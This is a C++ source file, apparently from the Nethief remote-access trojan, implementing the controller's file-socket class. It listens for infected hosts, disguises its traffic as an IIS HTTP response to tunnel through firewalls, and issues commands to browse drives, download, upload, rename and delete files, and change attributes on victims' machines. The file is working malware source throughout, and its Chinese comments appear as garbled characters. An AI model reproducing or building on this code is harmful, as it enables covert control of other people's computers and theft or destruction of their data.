// FileSocket.cpp: implementation of the CFileSocket class.
// Download by http://www.NewXing.com
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Nethief.h"
#include "FileSocket.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//************�����趨*******************
#define HTTP_RESPONSE_HEADER	"\
HTTP/1.1 200 OK\r\n\
Server: Microsoft-IIS/5.0\r\n\
Content-Length: %d\r\n\
Content-Type: text/html\r\n\
\r\n"
//***************************************

CFileSocket::CFileSocket()
{
	m_bStop=FALSE;		//������ֹͣ

	m_hConnectSocket=NULL;
	m_strHostName="";
	m_nHostAttribute=0;

	m_ArrayBuffer.SetSize(4096,4096);	//Buffer����
}

CFileSocket::~CFileSocket()
{

}
////////////////////////////////////////////////////////////////
void CFileSocket::Initial(CProgressCtrl* pProgress)
{
	m_pProgress=pProgress;
}

void CFileSocket::Close()
{
	//TODO...
}
////////////////////////////////////////////////////////////////
void CFileSocket::NotifyClientConnect(CString strClientName,BOOL bIsHttpTunnel)
{
	m_strClientName=strClientName;	//����׼�����ӵĿͻ��˵�������
	m_bIsHttpTunnel=bIsHttpTunnel;	//����׼�����ӵĿͻ����Ƿ���HTTP�������
	DWORD dwResult=0;//0 - ʧ��
#if ONLINE_TEST
	CCommunity*	pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	if(pCommunity->NotifyClientConnect(strClientName))
	{
		dwResult=1;//1 - �ɹ�
	}
	if(m_bStop)
	{
		dwResult=2;//2 - ��ֹͣ
	}
#else
	dwResult=1;
#endif
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_NOTIFYCONNECT,dwResult);
}

BOOL CFileSocket::BeginListen()
{
	closesocket(m_hListenSocket);

	CString strServerIP=((CNethiefApp*)AfxGetApp())->pCommunity->GetBindIP();

	m_hListenSocket=socket(AF_INET,SOCK_STREAM,0);
	if(m_hListenSocket==INVALID_SOCKET)
		AfxMessageBox("socket() failed");

	SOCKADDR_IN serveraddr;
	serveraddr.sin_family=AF_INET;
	serveraddr.sin_port=htons(60000);
	serveraddr.sin_addr.s_addr=inet_addr(strServerIP);

	if(bind(m_hListenSocket,(SOCKADDR*)&serveraddr,sizeof(serveraddr))==SOCKET_ERROR)
		return FALSE;
	if(listen(m_hListenSocket,1)==SOCKET_ERROR)
		AfxMessageBox("listen() failed");

	WSAAsyncSelect(m_hListenSocket,AfxGetMainWnd()->m_hWnd,WM_SOCKET,FD_ACCEPT);
	return TRUE;
}

void CFileSocket::EndListen()
{
	if(m_hConnectSocket!=NULL)
	{
		if(m_bIsHttpTunnel)//�����HTTP�������,�����˿ڲ�ע����Ϣ
			WSAAsyncSelect(m_hListenSocket,AfxGetMainWnd()->m_hWnd,NULL,NULL);
		else//�������HTTP�������,�رռ����˿�
			closesocket(m_hListenSocket);
	}
	else
		closesocket(m_hListenSocket);//û���յ�����˵�����,�رռ����˿�
}

void CFileSocket::DisconnectClient()
{
	if(m_bIsHttpTunnel)//�����HTTP�������,��ʱ�رռ����˿�
		closesocket(m_hListenSocket);

	closesocket(m_hConnectSocket);//�ر�����Socket
	m_hConnectSocket=NULL;
	m_strHostName="";
	m_nHostAttribute=0;
}
////////////////////////////////////////////////////////////////
void CFileSocket::OnSocketAccept()
{
	if(m_bIsHttpTunnel)//�ǵȴ�HTTP�������������
	{
		SOCKADDR_IN clientaddr;
		int len=sizeof(clientaddr);

		m_hConnectSocket=accept(m_hListenSocket,(SOCKADDR*)&clientaddr,&len);
		if(m_hConnectSocket==INVALID_SOCKET)
			AfxMessageBox("accept() failed");
		//////////////////////////////////////////////
		BYTE byBuffer[1024];
		while(1)//����POST����,��HTTPͷ
		{
			int nRet=recv(m_hConnectSocket,(char*)&byBuffer,sizeof(byBuffer),NULL);
			if(nRet==SOCKET_ERROR)
			{
				if(WSAGetLastError()==WSAEWOULDBLOCK)
				{
					Sleep(50);
					continue;	//����,����
				}
				else
					return;//������
			}
			else
				break;//��ȫ������������,��Ӱ����������
		}		
		//////////////////////////////////////////////
		m_strHostName=m_strClientName;//����������
		m_nHostAttribute=1;//������������

		CString strIP=inet_ntoa(clientaddr.sin_addr);
		int nPort=ntohs(clientaddr.sin_port);
		m_strAddress.Format(strIP+":%d",nPort);
	}
	else
	{
		SOCKADDR_IN clientaddr;
		int len=sizeof(clientaddr);

		m_hConnectSocket=accept(m_hListenSocket,(SOCKADDR*)&clientaddr,&len);
		if(m_hConnectSocket==INVALID_SOCKET)
			AfxMessageBox("accept() failed");

		m_strHostName=m_strClientName;
		m_nHostAttribute=0;
	
		CString strIP=inet_ntoa(clientaddr.sin_addr);
		int nPort=ntohs(clientaddr.sin_port);
		m_strAddress.Format(strIP+":%d",nPort);
	}
}

////////////////////////////////////////////////////////////////
void CFileSocket::Command_IDVerify()
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_IDVERIFY,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,0,CMD_IDVERIFY);
	if(dwResult==1)
	{		
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_IDVERIFY,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(RECV_IDVERIFY_INFO));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(RECV_IDVERIFY_INFO));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_IDVERIFY,dwResult);
}

void CFileSocket::Command_DownloadDiskDriveInfo()
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DOWNLOADDISKDRIVEINFO,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,0,CMD_DOWNLOADDISKDRIVEINFO);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DOWNLOADDISKDRIVEINFO,0);
				return;	//ʧ��
			}
		}

		DWORD dwDataSize=RecvCommandDataSize(m_hConnectSocket);
		m_ArrayBuffer.SetSize(dwDataSize);
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),dwDataSize);
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DOWNLOADDISKDRIVEINFO,dwResult);
}

void CFileSocket::Command_ExpandDirectory(CString strHostName,CString strPath)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strPath.GetLength()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_EXPANDDIRECTORY,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_EXPANDDIRECTORY,
		(BYTE*)(LPCSTR)strPath,strPath.GetLength());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_EXPANDDIRECTORY,0);
				return;	//ʧ��
			}
		}

		DWORD dwDataSize=RecvCommandDataSize(m_hConnectSocket);
		m_ArrayBuffer.SetSize(dwDataSize);
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),dwDataSize);
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_EXPANDDIRECTORY,dwResult);
}

void CFileSocket::Command_ShowFileList(CString strHostName,CString strPath)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strPath.GetLength()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWFILELIST,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_SHOWFILELIST,
		(BYTE*)(LPCSTR)strPath,strPath.GetLength());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWFILELIST,0);
				return;	//ʧ��
			}
		}

		DWORD dwDataSize=RecvCommandDataSize(m_hConnectSocket);
		m_ArrayBuffer.SetSize(dwDataSize);
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),dwDataSize);
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWFILELIST,dwResult);
}

void CFileSocket::Command_RenameFile(CString strHostName,CString strPath,CString strFilename1,CString strFilename2)
{
	///////////////////////////////////////
	int nPathLen=strPath.GetLength();
	int nFilename1Len=strFilename1.GetLength();
	int nFilename2Len=strFilename2.GetLength();
	m_ArrayBuffer.SetSize(nPathLen+1+nFilename1Len+1+nFilename2Len+1);
	memcpy(&m_ArrayBuffer[0],(LPCSTR)strPath,nPathLen+1);
	memcpy(&m_ArrayBuffer[0]+nPathLen+1,(LPCSTR)strFilename1,nFilename1Len+1);
	memcpy(&m_ArrayBuffer[0]+nPathLen+1+nFilename1Len+1,(LPCSTR)strFilename2,nFilename2Len+1);
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_RENAMEFILE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_RENAMEFILE,
		m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_RENAMEFILE,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_RENAMEFILE,dwResult);
}

void CFileSocket::Command_NewFile(CString strHostName,CString strFullFilename)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strFullFilename.GetLength()+1+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_NEWFILE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_NEWFILE,
		(BYTE*)(LPCSTR)strFullFilename,strFullFilename.GetLength()+1);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_NEWFILE,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_NEWFILE,dwResult);
}

void CFileSocket::Command_NewFolder(CString strHostName,CString strFullFilename)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strFullFilename.GetLength()+1+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_NEWFOLDER,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_NEWFOLDER,
		(BYTE*)(LPCSTR)strFullFilename,strFullFilename.GetLength()+1);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_NEWFOLDER,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_NEWFOLDER,dwResult);
}

void CFileSocket::Command_DeleteFile(CString strHostName,CString strFrom)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strFrom.GetLength()+1+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DELETEFILE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_DELETEFILE,
		(BYTE*)(LPCSTR)strFrom,strFrom.GetLength()+1);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DELETEFILE,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DELETEFILE,dwResult);
}

void CFileSocket::Command_RemotePaste(CString strHostName,
									  CString strFrom,CString strTo,DWORD dwFOFlags)
{
	///////////////////////////////////////
	int nFromLen=strFrom.GetLength();
	int nToLen=strTo.GetLength();
	m_ArrayBuffer.SetSize(sizeof(dwFOFlags)+nFromLen+1+nToLen+1);
	memcpy(&m_ArrayBuffer[0],&dwFOFlags,sizeof(dwFOFlags));
	memcpy(&m_ArrayBuffer[0]+sizeof(dwFOFlags),(LPCSTR)strTo,nToLen+1);
	memcpy(&m_ArrayBuffer[0]+sizeof(dwFOFlags)+nToLen+1,(LPCSTR)strFrom,nFromLen+1);
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTEPASTE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_REMOTEPASTE,
		m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTEPASTE,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_REMOTEPASTE,dwResult);
}

void CFileSocket::Command_GetOperationObject(CString strHostName,CString strFrom)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strFrom.GetLength()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_GETOPERATIONOBJECT,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_GETOPERATIONOBJECT,
		(BYTE*)(LPCSTR)strFrom,strFrom.GetLength());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_GETOPERATIONOBJECT,0);
				return;	//ʧ��
			}
		}

		DWORD dwDataSize=RecvCommandDataSize(m_hConnectSocket);
		m_ArrayBuffer.SetSize(dwDataSize);
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),dwDataSize);
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_GETOPERATIONOBJECT,dwResult);
}

void CFileSocket::Command_DownloadFile(CString strHostName,
									   CString strFilename1,CString strFilename2,
									   DWORD dwStartPosition,BOOL bIsCut)
{
	///////////////////////////////////////
	int nFilename1Len=strFilename1.GetLength();
	m_ArrayBuffer.SetSize(sizeof(bIsCut)+sizeof(dwStartPosition)+nFilename1Len+1);
	memcpy(&m_ArrayBuffer[0],&bIsCut,sizeof(bIsCut));
	memcpy(&m_ArrayBuffer[0]+sizeof(bIsCut),&dwStartPosition,sizeof(dwStartPosition));
	memcpy(&m_ArrayBuffer[0]+sizeof(bIsCut)+sizeof(dwStartPosition),(LPCSTR)strFilename1,nFilename1Len+1);
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DOWNLOADFILE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_DOWNLOADFILE,
		m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize(),FALSE);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DOWNLOADFILE,0);
				return;	//ʧ��
			}
		}
		////////////////////////////////////////////////////////////
		CreateMultilevelDir(strFilename2.Left(strFilename2.ReverseFind('\\')));

		CFile DestFile;
		if(dwStartPosition==0)//�Ǵ�ͷ����
		{
			DestFile.Open(strFilename2,
				CFile::modeCreate|CFile::modeWrite|CFile::shareDenyNone);
		}
		else//�Ƕϵ�����
		{
			DestFile.Open(strFilename2,CFile::modeWrite|CFile::shareDenyNone);
			DestFile.Seek(dwStartPosition,CFile::begin);
		}
		////////////////////////////////////////////////////////////
		DWORD dwFileLength=RecvCommandDataSize(m_hConnectSocket);
		m_ArrayBuffer.SetSize(4096);
		m_pProgress->SetPos((FLOAT)dwStartPosition/(FLOAT)dwFileLength*PROGRESS_RANGE);
		AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,OTR_REFRESHSTATUSBAR,(FLOAT)dwStartPosition/(FLOAT)dwFileLength*100);

		DWORD dwPoint=dwStartPosition;
		DWORD dwDiffer=0;
		while(dwPoint<dwFileLength)
		{
			dwDiffer=dwFileLength-dwPoint;
			if(dwDiffer>4096)
				dwDiffer=4096;
			dwPoint+=dwDiffer;

			dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),dwDiffer,FALSE);
			if(!dwResult)
				break;
			DestFile.Write(m_ArrayBuffer.GetData(),dwDiffer);
			m_pProgress->SetPos((FLOAT)dwPoint/(FLOAT)dwFileLength*PROGRESS_RANGE);
			/////////////////////////////////////////
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,OTR_REFRESHSTATUSBAR,(FLOAT)dwPoint/(FLOAT)dwFileLength*100);
		}
		DestFile.Close();
		m_pProgress->SetPos(0);
	}
	if(m_bStop)
	{
		m_bStop=FALSE;
		dwResult=2;
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_DOWNLOADFILE,dwResult);
}

void CFileSocket::Command_UploadFile(CString strHostName,
									 CString strFilename1,CString strFilename2,
									 DWORD dwStartPosition,BOOL bIsCut)
{
	CFileStatus rStatus;
	CFile::GetStatus(strFilename1,rStatus);
	DWORD dwFileLength=rStatus.m_size;

	m_pProgress->SetPos((FLOAT)dwStartPosition/(FLOAT)dwFileLength*PROGRESS_RANGE);
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,OTR_REFRESHSTATUSBAR,(FLOAT)dwStartPosition/(FLOAT)dwFileLength*100);

	int nFilename2Len=strFilename2.GetLength();
	m_ArrayBuffer.SetSize(sizeof(bIsCut)+sizeof(dwStartPosition)+sizeof(dwFileLength)+nFilename2Len+1);
	memcpy(&m_ArrayBuffer[0],&bIsCut,sizeof(bIsCut));
	memcpy(&m_ArrayBuffer[0]+sizeof(bIsCut),&dwStartPosition,sizeof(dwStartPosition));
	memcpy(&m_ArrayBuffer[0]+sizeof(bIsCut)+sizeof(dwStartPosition),&dwFileLength,sizeof(dwFileLength));
	memcpy(&m_ArrayBuffer[0]+sizeof(bIsCut)+sizeof(dwStartPosition)+sizeof(dwFileLength),
		(LPCSTR)strFilename2,nFilename2Len+1);
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD)+sizeof(DWORD)+dwFileLength);
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_UPLOADFILE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_UPLOADFILE,
		m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize(),FALSE);
	if(dwResult==1)
	{
		CFile SrcFile(strFilename1,CFile::modeRead|CFile::shareDenyNone);
		SrcFile.Seek(dwStartPosition,CFile::begin);
		//////////////////////////////////////////////////////////////
		m_ArrayBuffer.SetSize(4096);

		DWORD dwPoint=dwStartPosition;
		DWORD dwDiffer=0;
		while(dwPoint<dwFileLength)
		{
			dwDiffer=dwFileLength-dwPoint;
			if(dwDiffer>4096)
				dwDiffer=4096;
			dwPoint+=dwDiffer;

			SrcFile.Read(m_ArrayBuffer.GetData(),dwDiffer);
			BOOL bRet=SendCommand(m_hConnectSocket,3,NULL,m_ArrayBuffer.GetData(),dwDiffer,FALSE);
			if(!bRet)
				break;
			m_pProgress->SetPos((FLOAT)dwPoint/(FLOAT)dwFileLength*PROGRESS_RANGE);
			/////////////////////////////////////////
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,OTR_REFRESHSTATUSBAR,(FLOAT)dwPoint/(FLOAT)dwFileLength*100);
		}
		SrcFile.Close();
		//////////////////////////////////////////////////////////////
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_UPLOADFILE,0);
				return;	//ʧ��
			}
		}

		DWORD dwReturn=0;
		dwResult=RecvCommandData(m_hConnectSocket,(BYTE*)&dwReturn,sizeof(dwReturn),FALSE);
		if(bIsCut && dwReturn)
			DeleteFile(strFilename1);
		m_pProgress->SetPos(0);
	}
	if(m_bStop)
	{
		m_bStop=FALSE;
		dwResult=2;
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_UPLOADFILE,dwResult);
}

void CFileSocket::Command_ShowProperty_Multi(CString strHostName,CString strPath)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strPath.GetLength()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_MULTI,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_SHOWPROPERTY_MULTI,
		(BYTE*)(LPCSTR)strPath,strPath.GetLength());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_MULTI,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(RECV_PROPERTYMULTI_INFO));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(RECV_PROPERTYMULTI_INFO));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_MULTI,dwResult);
}

void CFileSocket::Command_ShowProperty_Single(CString strHostName,CString strFilename)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strFilename.GetLength()+1+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_SINGLE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_SHOWPROPERTY_SINGLE,
		(BYTE*)(LPCSTR)strFilename,strFilename.GetLength()+1);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_SINGLE,0);
				return;	//ʧ��
			}
		}

		DWORD dwDataSize=RecvCommandDataSize(m_hConnectSocket);
		m_ArrayBuffer.SetSize(dwDataSize);
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),dwDataSize);
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_SINGLE,dwResult);
}

void CFileSocket::Command_ModifyProperty_Single(CString strHostName,CString strFilename,DWORD dwFileAttributes)
{
	int nFilenameLen=strFilename.GetLength();
	m_ArrayBuffer.SetSize(sizeof(dwFileAttributes)+nFilenameLen+1);
	memcpy(&m_ArrayBuffer[0],&dwFileAttributes,sizeof(dwFileAttributes));
	memcpy(&m_ArrayBuffer[0]+sizeof(dwFileAttributes),(LPCSTR)strFilename,nFilenameLen+1);
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(m_ArrayBuffer.GetSize()+sizeof(DWORD)+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_MODIFYPROPERTY_SINGLE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,2,CMD_MODIFYPROPERTY_SINGLE,
		m_ArrayBuffer.GetData(),m_ArrayBuffer.GetSize());
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_MODIFYPROPERTY_SINGLE,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(DWORD));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(DWORD));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_MODIFYPROPERTY_SINGLE,dwResult);
}

void CFileSocket::Command_ShowProperty_Diskdrive(CString strHostName,CString strDiskDrive)
{
	//////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
		BOOL bSucceed=HttpTunnelSendHeader(strDiskDrive.GetLength()+1+sizeof(DWORD));
		if(!bSucceed)
		{
			AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_DISKDRIVE,0);
			return;	//ʧ��
		}
	}

	DWORD dwResult=SendCommand(m_hConnectSocket,1,CMD_SHOWPROPERTY_DISKDRIVE,
		(BYTE*)(LPCSTR)strDiskDrive,strDiskDrive.GetLength()+1);
	if(dwResult==1)
	{
		if(m_nHostAttribute)//��HTTP�������
		{
			BOOL bSucceed=HttpTunnelRecvHeader();
			if(!bSucceed)
			{
				AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_DISKDRIVE,0);
				return;	//ʧ��
			}
		}

		m_ArrayBuffer.SetSize(sizeof(RECV_PROPERTYDISKDRIVE_INFO));
		dwResult=RecvCommandData(m_hConnectSocket,m_ArrayBuffer.GetData(),sizeof(RECV_PROPERTYDISKDRIVE_INFO));
	}
	AfxGetMainWnd()->PostMessage(WM_WORKTHREAD,CMD_SHOWPROPERTY_DISKDRIVE,dwResult);
}

void CFileSocket::Command_ModifyProperty_Diskdrive(CString strHostName,CString strDiskDrive,CString strVolumeName)
{
	int nVolumeNameLen=strVolumeName.GetLength();
	m_ArrayBuffer.SetSize(4+nVolumeNameLen+1);
	memcpy(&m_ArrayBuffer[0],(LPCSTR)strDiskDrive,4);
	memcpy(&m_ArrayBuffer[0]+4,(LPCSTR)strVolumeName,nVolumeNameLen+1);
	///////////////////////////////////////
	if(m_nHostAttribute)//��HTTP�������
	{
